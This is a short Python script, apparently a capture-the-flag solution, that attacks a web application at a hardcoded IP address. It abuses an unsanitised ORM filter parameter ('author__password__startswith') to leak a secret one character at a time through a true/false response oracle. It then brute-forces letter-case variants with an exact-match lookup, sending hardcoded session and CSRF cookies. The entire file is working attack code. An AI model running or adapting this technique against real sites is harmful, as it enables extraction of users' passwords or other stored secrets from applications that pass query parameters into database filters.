import urllib3
import requests
import sys

BASE_URL = "http://54.213.160.137:8000/"
CSRF_TOKEN = "Mz0IQlmWNWGDHaGEr7UzxluP6sT79cLehXiqSKKmAW6VoyddkvHoLYYFyTdP5IgA"
SESSION_ID = "vwvea0x8jmz16ys6d5xoyu304x7mq7ng"


def permute(inp):
    n = len(inp)
    passwords = []

    # Number of permutations is 2^n
    mx = 1 << n

    # Converting string to lower case
    inp = inp.lower()

    # Using all subsequences and permuting them
    for i in range(mx):
        # If j-th bit is set, we convert it to upper case
        combination = [k for k in inp]
        for j in range(n):
            if (((i >> j) & 1) == 1):
                combination[j] = inp[j].upper()

        temp = ""
        # Printing current combination
        for i in combination:
            temp += i
        passwords.append(temp)

    return passwords


def find_password_chars():
    password = []

    while len(password) == 0 or password[-1] != '}':
        for i in range(128):
            r1 = requests.get(
                BASE_URL + "?filter=author__password__startswith%3Dflag{" + ''.join(password) + str(chr(i)),
                cookies={"csrftoken": CSRF_TOKEN, "sessionid": SESSION_ID})

            if "Extreme" in str(r1.content):
                if chr(i) != '#' and chr(i) != '&' and chr(i) != ';' and i != 0:
                    password.append(chr(i))
                    print("Found " + chr(i))
                    break

    return password


def find_exact_password(password_input):
    passwords = permute(password_input)

    for password in passwords:
        r1 = requests.get(BASE_URL + "?filter=author__password__exact%3Dflag{" + password + "}",
                          cookies={"csrftoken": CSRF_TOKEN, "sessionid": SESSION_ID})

        if "Extreme" in str(r1.content):
            print("Found exact password:" + password)
            break


if __name__ == '__main__':
    password = find_password_chars()
    password = ''.join(password[:-1])
    find_exact_password(password)
